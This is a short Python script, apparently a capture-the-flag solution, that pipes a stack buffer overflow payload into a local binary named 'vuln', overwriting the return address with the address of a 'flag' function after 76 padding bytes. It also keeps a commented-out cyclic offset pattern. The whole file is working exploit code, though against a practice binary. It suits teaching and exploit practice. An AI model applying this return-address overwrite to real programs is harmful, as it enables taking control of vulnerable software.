import subprocess as sp
#payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab" + "C"*4 payload pattern 200
flag_func_add = "\xe6\x85\x04\x08"
payload = "A"*76+flag_func_add+"C"*120+"D"*4
#flag = 0x080485e6 = /xe6/x85/x04/x08
p=sp.Popen(['./vuln'],stdin=sp.PIPE,stdout=sp.PIPE)
(out,err)=p.communicate(payload)
print (out)
